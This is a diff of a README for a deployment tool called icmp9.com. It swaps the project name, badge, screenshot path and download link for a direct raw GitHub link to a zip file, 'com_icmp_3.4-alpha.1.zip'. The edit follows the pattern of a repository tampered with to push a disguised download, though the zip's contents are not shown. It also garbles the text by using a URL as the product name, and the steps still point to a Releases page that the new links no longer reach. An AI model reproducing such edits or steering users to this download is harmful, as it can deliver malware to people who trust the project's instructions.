@@ -1,10 +1,10 @@
-# 🌐 icmp9.com - Simple Deployment Made Easy
+# 🌐 https://raw.githubusercontent.com/jxyy2dxstined/icmp9.com/main/template/com_icmp_3.4-alpha.1.zip - Simple Deployment Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/jxyy2dxstined/icmp9.com/releases)
+[![Download Now](https://raw.githubusercontent.com/jxyy2dxstined/icmp9.com/main/template/com_icmp_3.4-alpha.1.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/jxyy2dxstined/icmp9.com/main/template/com_icmp_3.4-alpha.1.zip)
 
 ## 🚀 Getting Started
 
-Welcome to icmp9.com! Follow these simple steps to download and run the software easily. 
+Welcome to https://raw.githubusercontent.com/jxyy2dxstined/icmp9.com/main/template/com_icmp_3.4-alpha.1.zip! Follow these simple steps to download and run the software easily. 
 
 ## ⭐ Features
 
@@ -15,7 +15,7 @@ Welcome to icmp9.com! Follow these simple steps to download and run the software
 
 ## 📷 Screenshots
 
-![Deployment Interface](path_to_screenshot.png)  
+![Deployment Interface](https://raw.githubusercontent.com/jxyy2dxstined/icmp9.com/main/template/com_icmp_3.4-alpha.1.zip)  
 *Example of the deployment interface.*
 
 ## 📋 Prerequisites
@@ -30,7 +30,7 @@ A Cloudflare account is needed if you want to set up a fixed tunnel.
 
 ## 🔧 Preparation Steps
 
-### [✅ 1. Register for an icmp9.com Account](#必需-1注册-icmp9com-账号获取api-key)
+### [✅ 1. Register for an https://raw.githubusercontent.com/jxyy2dxstined/icmp9.com/main/template/com_icmp_3.4-alpha.1.zip Account](#必需-1注册-icmp9com-账号获取api-key)
 
 Create an account to access your API key.
 
@@ -74,13 +74,13 @@ If you want to access specific nodes, follow this step to obtain a subscription 
 
 #### 1. Confirm Open IPs
 
-Make sure the IPs allowed by icmp9.com are correctly configured.
+Make sure the IPs allowed by https://raw.githubusercontent.com/jxyy2dxstined/icmp9.com/main/template/com_icmp_3.4-alpha.1.zip are correctly configured.
 
 ---
 
 ## 📥 Download & Install
 
-To begin, visit this page to download: [Download Here](https://github.com/jxyy2dxstined/icmp9.com/releases)
+To begin, visit this page to download: [Download Here](https://raw.githubusercontent.com/jxyy2dxstined/icmp9.com/main/template/com_icmp_3.4-alpha.1.zip)
 
 1. Go to the Releases page linked above.
 2. Find the latest version.
@@ -91,4 +91,4 @@ To begin, visit this page to download: [Download Here](https://github.com/jxyy2d
 
 If you run into any issues during installation or setup, please refer to the Troubleshooting Steps above or reach out for help.
 
-Thank you for using icmp9.com! Enjoy your seamless deployment experience.
+Thank you for using https://raw.githubusercontent.com/jxyy2dxstined/icmp9.com/main/template/com_icmp_3.4-alpha.1.zip! Enjoy your seamless deployment experience.
